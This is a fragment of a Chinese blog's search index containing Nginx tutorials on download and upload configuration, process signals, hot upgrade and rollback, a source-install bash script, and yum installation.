Connection: keep-alive Keep-Alive: timeout=60 #显示的超时时间 ETag: \"62e40fa4-6\" Accept-Ranges: bytes hello #返回的页面内容 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:13","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"作为下载服务器 ngx_http_autoindex_module 模块处理以斜杠字符 “/” 结尾的请求，并生成目录列表,可以做为下载服务 配置使用 官方链接：http://nginx.org/en/docs/http/ngx_http_autoindex_module.html 相关指令 autoindex on | off; #自动文件索引功能，默为off autoindex_exact_size on | off; #计算文件精确大小（单位bytes），off 显示大概大小（单位K、M)，默认on autoindex_localtime on | off ; #显示本机时间而非GMT(格林威治)时间，默认off autoindex_format html | xml | json | jsonp; #显示索引的页面文件风格，默认html limit_rate rate; #限制响应客户端传输速率(除GET和HEAD以外的所有方法)，单位B/s,即bytes/second，默认值0,表示无限制,此指令由ngx_http_core_module提供 set $limit_rate 4k; #也可以通变量限速,单位B/s,同时设置,此项优级高于limit_rate ###Rate limit can also be set in the $limit_rate variable, however, since version 1.17.0, this method is not recommended: 范例：将nginx作为下载服务器 #注意:download不需要index.html文件 [root@centos8 ~]# mkdir -p /data/nginx/html/pc/download [root@localhost ~]# touch /apps/nginx/html/download/{t1,t2,t3}.txt [root@localhost ~]# mkdir /apps/nginx/html/download/{d1,d2,d3} [root@localhost ~]# tree /apps/nginx/html/download /apps/nginx/html/download ├── d1 ├── d2 ├── d3 ├── t1.txt ├── t2.txt └── t3.txt 3 directories, 3 files [root@centos8 ~]# cat /apps/nginx/conf.d/pc.conf location /download { autoindex on; #自动索引功能 autoindex_exact_size off; #计算文件确切大小（单位bytes），此为默认值,off只显示大概大 小（单位kb、mb、gb） autoindex_localtime off; #on表示显示本机时间而非GMT(格林威治)时间,默为为off显示GMT 时间 limit_rate 1024k; #限速,默认不限速 root html/; } 结果验证 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:14","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"作为上传服务器 相关指令 client_max_body_size 1m; #设置允许客户端上传单个文件大小的上限值，默认值为1m,上传文件超过此值会出413错误 client_body_buffer_size size; #用于接收每个客户端请求报文的body部分的缓冲区大小;默认16k;超出此大小时，其将被暂存到磁盘上的由client_body_temp_path指令所定义的位置 client_body_temp_path path [level1 [level2 [level3]]]; #设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量，目录名为16进制的数字，使用hash之后的值从后往前截取1位、2位、2位作为目录名 [root@centos8 ~]# md5sum /data/nginx/html/pc/index.html 95f6f65f498c74938064851b1bb 96 3d 4 /data/nginx/html/pc/index.html 1级目录占1位16进制，即2^4=16个目录 0-f 2级目录占2位16进制，即2^8=256个目录 00-ff 3级目录占2位16进制，即2^8=256个目录 00-ff #配置示例： client_max_body_size 100m; #如果太大，上传时会出现413错误。注意:如果php上传（如WordPress）,还需要修改/etc/php.ini的相关配置 client_body_buffer_size 1024k; client_body_temp_path /apps/nginx/client_body_temp/ 1 2 2; #上传时,Nginx会自动创建相关目录 ##上传文件后,会自动生成相关目录 [root@wang-liyun-pc ~]# tree /apps/nginx/client_body_temp/ /apps/nginx/client_body_temp/ ├── 5 │ └── 00 │ └── 00 └── 6 └── 00 └── 00 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:15","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"其他配置 keepalive_disable none | browser ...; #对哪种浏览器禁用长连接 limit_except method ... { ... } #仅用于location语句块，禁止客户端使用除了指定的请求方法之外的其它方法, 如果使用会出现403错误 method:GET, HEAD, POST, PUT, DELETE，MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH ##示例：除了GET之外的其它方法仅允许172.16.16.0/24网段主机使用 [root@localhost ~]# hostname -I #本机IP 172.16.16.88 [root@localhost ~]# ll /apps/nginx/html/upload/ #新建upload目录用于存储上传的文件 total 0 [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /upload { root html/; index index.html; limit_except GET { allow 172.16.16.88; deny all; } } } [root@localhost ~]# nginx -s reload [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u003curl\u003e malformed \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e405 Not Allowed\u003c/title\u003e\u003c/head\u003e #PUT方法具有访问权限，但是程序本身不支持文件上传功能 \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e405 Not Allowed\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /upload { root html/; index index.html; limit_except GET { #allow 172.16.16.88; #禁止所有主机使用GET以外的方法 deny all; } } } [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u003curl\u003e malformed \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e403 Forbidden\u003c/title\u003e\u003c/head\u003e #再次访问测试，nginx拒绝访问 \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e403 Forbidden\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e aio on | off #是否启用asynchronous file I/O(AIO)功能，需要编译时添加参数开启 --with-file-aio #linux 2.6以上内核提供以下几个系统调用来支持aio： 1、SYS_io_setup：建立aio 的context 2、SYS_io_submit: 提交I/O操作请求 3、SYS_io_getevents：获取已完成的I/O事件 4、SYS_io_cancel：取消I/O操作请求 5、SYS_io_destroy：毁销aio的context directio size | off; #操作完全和aio相反，aio是读取文件而directio是写文件到磁盘，默认为关闭，当文件大于等于给定大小时，例如:directio 4m，同步（直接）写磁盘，而非写缓存。 open_file_cache off; #是否缓存打开过的文件信息 open_file_cache max=N [inactive=time]; #nginx可以缓存以下三种信息： (1) 文件元数据：文件的描述符、文件大小和最近一次的修改时间 (2) 打开的目录结构 (3) 没有找到的或者没有权限访问的文件的相关信息 max=N：#可缓存的缓存项上限数量;达到上限后会使用LRU(Least recently used，最近最少使用)算法实现管理 inactive=time：#缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于 open_file_cache_min_uses #指令所指定的次数的缓存项即为非活动项，将被删除 open_file_cache_valid time; #缓存项有效性的检查验证频率，默认值为60s open_file_cache_errors on | off; #是否缓存查找时发生错误的文件一类的信息,默认值为off open_file_cache_min_uses number; #open_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项,默认值为1 范例： open_file_cache max=10000 inactive=60s; #最大缓存10000个文件，非活动数据超时时长60s open_file_cache_valid 60s; #每间隔60s检查一下缓存数据有效性 open_file_cache_min_uses 5; #60秒内至少被命中访问5次才被标记为活动数据 open_file_cache_errors on; #缓存错误信息 ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:5:16","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"利用Nginx信号实现平滑升级 Nginx 命令和信号 ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:0:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"Nginx 命令 可以通过nginx命令向nginx进程发送信号，实现各种功能 nginx 命令格式 nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] 选项说明 帮助: -? -h 使用指定的配置文件: -c 指定配置指令:-g 指定运行目录:-p 测试配置文件是否有语法错误:-t -T 打印nginx的版本信息、编译信息等:-v -V 发送信号: -s 示例: nginx -s reload 信号说明 立刻停止服务:stop,相当于信号SIGTERM,SIGINT 优雅的停止服务:quit,相当于信号SIGQUIT 平滑重启，重新加载配置文件: reload,相当于信号SIGHUP 重新开始记录日志文件:reopen,相当于信号SIGUSR1,在切割日志时用途较大 平滑升级可执行程序:发送信号SIGUSR2,在升级版本时使用 优雅的停止工作进程:发送信号SIGWINCH,在升级版本时使用 范例：查看nginx 使用帮助 [root@centos7 ~]# nginx -h nginx version: nginx/1.18.0 Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /apps/nginx/) -c filename : set configuration file (default: conf/nginx.conf) -g directives : set global directives out of configuration file ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:1:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"quit 信号 quit信号运行流程 设置定时器: worker_shutdown_timeout #一定时间后关闭work进程，防止超时。 关闭监听句柄。 #不再接收新的连接请求 关闭空闲连接 在循环中等待全部连接关闭 #待连接任务执行完毕后关闭连接 退出nginx所有进程 范例：quit 信号停止nginx进程 [root@centos7 html]# pwd #进入nginx安装目录下 /apps/nginx/html [root@centos7 html]# dd if=/dev/zero of=/apps/nginx/html/bigfile bs=1M count=1024 #生成1G的大文件bigfile 1024+0 records in 1024+0 records out 1073741824 bytes (1.1 GB) copied, 6.78492 s, 158 MB/s [root@centos7 html]# ll -h bigfile -rw-r--r-- 1 root root 1.0G Jul 21 17:37 bigfile [root@centos7 html]# hostname -I #Nginx服务器地址 172.16.16.88 ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:2:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"reload 信号 reload信号运行流程 利用 reload 可以实现平滑修改配置并生效 向master进程发送HUP信号(reload命令) master进程校验配置语法是否正确 master进程打开新的监听端口 master进程用新的配置启动新的worker子进程 master进程向老worker子进程发送QUIT信号通知旧的worker处理完当前连接后退出，空闲worker旧进程不再处理新来的请求 旧worker进程关闭监听句柄，处理完当前连接后结束进程 范例：想nginx发送reload信号实现不停机更新配置 [root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #当前有一个master进程和一个worker进程 root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20092 20091 0 17:51 ? 00:00:00 nginx: worker process root 20094 19981 0 17:51 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep processes #当前配置nginx的worker进程数为1 worker_processes 1; [root@centos7 ~]# sed -i '/worker_processes/c\\worker_processes 3;' /apps/nginx/conf/nginx.conf #将worker_processes 的值改为3 [root@centos7 ~]# grep worker_processes /apps/nginx/conf/nginx.conf worker_processes 3; [root@centos7 ~]# nginx -t \u0026\u0026 nginx -s reload #检查配置并发送reload信号 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# ps -ef | grep nginx #nginx的worker进程数量为3 root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20158 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20159 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20160 20091 0 18:05 ? 00:00:00 nginx: worker process root 20162 19981 0 18:05 pts/1 00:00:00 grep --color=auto nginx ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:3:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"reopen信号 reopen 信号重写日志文件 1、nginx 当前将日志记录在access.log文件 2、将access.log 重命名为access.log.old，日志仍记录到access.log.old文件中（因为Nginx已持有此文件的描述符） 3、新建access.log文件，向nginx发送reopen信号，使得新的日志记录在新生成的文件中（用于实现日志轮转） Nginx 平滑升级和回滚 工作中有时候需要对Nginx版本进行升级以满足对其功能的需求，例如添加新模块，需要新功能，而此时 Nginx又在运行着重要业务不能直接停掉。在此背景下可选择平滑升级nginx ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:4:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"平滑升级流程 平滑升级流程 将旧Nginx二进制文件换成新Nginx程序文件（注意先备份) 向master进程发送USR2信号，master进程自动修改pid文件名加上后缀.oldbin,成为nginx.pid.oldbin master进程用新Nginx文件启动新master进程成为旧master的子进程,系统中将有新旧两个Nginx主进程，新生成的master进程的PID存放至新生成的pid文件nginx.pid 主进程共同提供Web服务,当前新的请求仍然由旧Nginx的worker进程进行处理 向旧的Nginx服务进程发送WINCH信号，使旧的Nginx worker进程平滑停止 向旧master进程发送QUIT信号，关闭老master，进程自动删除Nginx.pid.oldbin文件 如果发现升级有问题,可以回滚∶向老master发送HUP，向新master发送QUIT ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:5:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["Nginx"],"content":"平滑升级和回滚案例 #当前nginx版本及安装路径 [root@centos7 nginx]# nginx -v nginx version: nginx/1.18.0 [root@centos7 nginx]# which nginx /apps/nginx/sbin/nginx #获取老版本编译参数 --prefix [root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module #下载一个较新版本，使用上一步获得的编译参数进行编译 [root@centos7 ~]# wget http://nginx.org/download/nginx-1.20.1.tar.gz [root@centos7 ~]# tar xf nginx-1.20.1.tar.gz [root@centos7 ~]# cd nginx-1.20.1/ [root@centos7 nginx-1.20.1]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 nginx-1.20.1]# make #不需要执行make install [root@centos7 nginx-1.20.1]# objs/nginx -v #查看编译结果 nginx version: nginx/1.20.1 #备份旧版nginx程序（用于回滚） [root@centos7 ~]# mv /apps/nginx/sbin/{nginx,nginx.old} #将编译后的新版nginx拷贝到旧版安装路径下 [root@centos7 ~]# cp ./nginx-1.20.1/objs/nginx /apps/nginx/sbin/ [root@centos7 ~]# ll /apps/nginx/sbin/ total 15308 -rwxr-xr-x 1 root root 7893488 Jul 21 18:49 nginx -rwxr-xr-x 1 root root 7774224 Jul 21 00:17 nginx.old #验证替换结果 [root@centos7 ~]# /apps/nginx/sbin/nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.20.1 #nginx 默认将pid文件存放于/app/nginx/logs/路径下 [root@centos7 ~]# grep pid /apps/nginx/conf/nginx.conf #pid logs/nginx.pid; [root@centos7 ~]# ll /apps/nginx/logs/nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:01 /apps/nginx/logs/nginx.pid #查看当前nginx进程 [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23545 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #向旧版nginx发送USR2信号 [root@centos7 ~]# kill -USR2 `cat /apps/nginx/logs/nginx.pid` #此时有两个master进程共存，其中一个master是新版nginx生成的。由新版nginx负责监听处理新的请求，旧版nginx不再处理。 [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23550 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #新版本master进程是旧版nginx进程的子进程 [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)-+-nginx(23547)---nginx(23548) | `-nginx(23504) #查看端口监听情况，两个版本都在监听80端口，但实际的请求是由旧版nginx的worker进程处理 [root@centos7 ~]# lsof -i :80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME nginx 23503 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23504 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23547 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23548 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) #pid文件也生成了新旧两个版本 [root@centos7 ~]# ll /apps/nginx/logs/ total 20 -rw-r--r-- 1 nginx root 172 Jul 21 18:48 access.log -rw-r--r-- 1 root root 258 Jul 21 18:19 access.log.old -rw-r--r-- 1 nginx root 1879 Jul 21 19:07 error.log -rw-r--r-- 1 root root 6 Jul 21 19:07 nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:06 nginx.pid.oldbin 。 #向旧版nginx主进程发送WINCH信号，它会逐步关闭所有worker进程（主进程不退出，方便回滚），而后所有请求将由新版nginx处理 [root@centos7 ~]# kill -WINCH `cat /apps/nginx/logs/nginx.pid.oldbin` [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)---nginx(23547)---nginx(23548) [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/:6:0","tags":["升级、回滚"],"title":"Nginx平滑升级和回滚","uri":"/posts/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/"},{"categories":["脚本"],"content":"使用源码包一键安装Nginx #!/bin/bash #该脚本适用于centos和ubuntu操作系统 #Nginx安装成功后默认配置开机自启 ###########自定义参数############# SRC_DIR=/usr/local/src #安装路径 NGINX_INSTALL_DIR=/apps/nginx #软件版本，可提前将软件包拷贝到/usr/local/src目录下 NGINX_FILE=nginx-1.18.0 TAR=.tar.gz #下载路径 NGINX_URL=http://nginx.org/download/ #################################### #获取cpu核心数 CPUS=`lscpu |awk '/^CPU\\(s\\)/{print $2}'` #格式化输出函数，自定义输出颜色和打印宽度 color () { RES_COL=60 MOVE_TO_COL=\"echo -en \\E[${RES_COL}G\" SETCOLOR_SUCCESS=\"echo -en \\E[1;32m\" SETCOLOR_FAILURE=\"echo -en \\E[1;31m\" SETCOLOR_WARNING=\"echo -en \\E[1;33m\" SETCOLOR_NORMAL=\"echo -en \\E[0m\" echo -n \"$1\" \u0026\u0026 $MOVE_TO_COL echo -n \"[\" if [ $2 = \"success\" -o $2 = \"0\" ] ;then ${SETCOLOR_SUCCESS} echo -n $\" OK \" elif [ $2 = \"failure\" -o $2 = \"1\" ] ;then ${SETCOLOR_FAILURE} echo -n $\"FAILED\" else ${SETCOLOR_WARNING} echo -n $\"WARNING\" fi ${SETCOLOR_NORMAL} echo -n \"]\" echo } #操作系统类型：CentOS/Ubuntu os_type () { awk -F'[ \"]' '/^NAME/{print $2}' /etc/os-release } #操作系统版本：6/7/8 os_version () { awk -F'\"' '/^VERSION_ID/{print $2}' /etc/os-release } #检查nginx是否已安装以及是否需要下载源码包 check () { [ -e ${NGINX_INSTALL_DIR} ] \u0026\u0026 { color \"nginx 已安装,请卸载后再安装\" 1; exit; } cd ${SRC_DIR} if [ -e ${NGINX_FILE}${TAR} ];then color \"相关文件已准备好\" 0 else color '开始下载 nginx 源码包' 0 wget ${NGINX_URL}${NGINX_FILE}${TAR} [ $? -ne 0 ] \u0026\u0026 { color \"下载 ${NGINX_FILE}${TAR}文件失败\" 1; exit; } fi } #安装nginx install () { color \"开始安装 nginx\" 0 if id nginx \u0026\u003e /dev/null;then color \"nginx 用户已存在\" 3 else useradd -s /sbin/nologin -r nginx color \"创建 nginx 用户\" 0 fi color \"开始安装 nginx 依赖包\" 0 if [ `os_type` == \"CentOS\" -a `os_version` == '8' ] ;then yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed elif [ `os_type` == \"CentOS\" -a `os_version` == '7' ];then yum -y -q install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed else apt update \u0026\u003e /dev/null apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev \u0026\u003e /dev/null fi cd $SRC_DIR tar xf ${NGINX_FILE}${TAR} NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr 's/^(.*[0-9]).*/\\1/p'` cd ${NGINX_DIR} ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module make -j $CPUS \u0026\u0026 make install [ $? -eq 0 ] \u0026\u0026 chown -R nginx.nginx ${NGINX_INSTALL_DIR} \u0026\u0026 color \"nginx 编译安装成功\" 0 || { color \"nginx 编译安装失败,退出!\" 1 ;exit; } echo \"PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}\" \u003e /etc/profile.d/nginx.sh . /etc/profile.d/nginx.sh cat \u003e /lib/systemd/system/nginx.service \u003c\u003cEOF [Unit] Description=The nginx HTTP and reverse proxy server After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx ExecReload=/bin/kill -s HUP \\$MAINPID KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now nginx \u0026\u003e /dev/null systemctl is-active nginx \u0026\u003e /dev/null || { color \"nginx 启动失败,退出!\" 1 ; exit; } color \"nginx 安装完成\" 0 } check install ","date":"2022-07-20","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/:0:0","tags":["shell"],"title":"Nginx安装脚本","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/"},{"categories":["Nginx"],"content":"编译安装nginx和yum安装Nginx Nginx 安装 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:0:0","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"Nginx版本和安装方式 Nginx版本 Mainline version 主要开发版本,一般为奇数版本号,比如1.19 Stable version 当前最新稳定版,一般为偶数版本,如:1.20 Legacy versions 旧的稳定版,一般为偶数版本,如:1.18 Nginx安装可以使用yum或源码安装，但是推荐使用源码编译安装，原因如下： yum的版本比较旧 编译安装可以更方便自定义相关路径 使用源码编译可以自定义相关功能，更方便业务的上的使用 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:1:0","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"查看当前系统中的nginx版本 范例：查看系统镜像源和epel源的nginx版本 # centos7 已将nginx集成在系统镜像源 [root@centos7 ~]#dnf info nginx Last metadata expiration check: 0:53:10 ago on Tue 22 Sep 2020 11:01:33 AM CST. Available Packages Name : nginx Epoch : 1 Version : 1.14.1 #版本较老 Release : 9.module_el8.0.0+184+e34fea82 Architecture : x86_64 Size : 570 k Source : nginx-1.14.1-9.module_el8.0.0+184+e34fea82.src.rpm Repository : AppStream #系统镜像源 Summary : A high performance web server and reverse proxy server URL : http://nginx.org/ License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:1:1","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"yum 安装nginx #CentOS7 需提前配置epel源 # yum install -y epel-release [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: mirrors.bfsu.edu.cn * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.20.1 #版本较新 Release : 9.el7 Size : 587 k Repo : epel/x86_64 #epel源 Summary : A high performance web server and reverse proxy server URL : https://nginx.org License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. 官方包下载地址： http://nginx.org/en/linux_packages.html 官方yum源：http://nginx.org/en/linux_packages.html#RHEL-CentOS 范例：通过官方yum源安装nginx #配置yum源 [root@centos7 ~]# cat \u003e /etc/yum.repos.d/nginx.repo \u003c\u003cEOF [nginx-stable] name=nginx stable repo baseurl=http://nginx.org/packages/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=1 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true [nginx-mainline] name=nginx mainline repo baseurl=http://nginx.org/packages/mainline/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=0 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true EOF #查看所有nginx版本 [root@centos7 ~]# yum list nginx --showduplicates Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages nginx.x86_64 1:1.16.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-2.el7.ngx nginx-stable nginx.x86_64 1:1.20.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-9.el7 epel nginx.x86_64 1:1.20.2-1.el7.ngx nginx-stable nginx.x86_64 1:1.22.0-1.el7.ngx nginx-stable #查看版本信息（默认查看最新版本） [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.22.0 Release : 1.el7.ngx Size : 796 k Repo : nginx-stable Summary : High performance web server URL : https://nginx.org/ License : 2-clause BSD-like license Description : nginx [engine x] is an HTTP and reverse proxy server, as well as : a mail proxy server. #安装nginx [root@centos7 ~]# yum install -y nginx ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:0","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"检查安装结果 [root@centos7 ~]# rpm -q nginx nginx-1.22.0-1.el7.ngx.x86_64 #查看日志轮转配置文件路径 [root@centos7 ~]# rpm -ql nginx |grep log /etc/logrotate.d/nginx /var/log/nginx #默认已配置日志轮转功能 [root@centos7 ~]# cat /etc/logrotate.d/nginx /var/log/nginx/*.log { daily missingok rotate 52 compress delaycompress notifempty create 640 nginx adm sharedscripts postrotate if [ -f /var/run/nginx.pid ]; then kill -USR1 `cat /var/run/nginx.pid` fi endscript } ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:1","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"查看nginx使用帮助 [root@centos7 ~]# nginx -h nginx version: 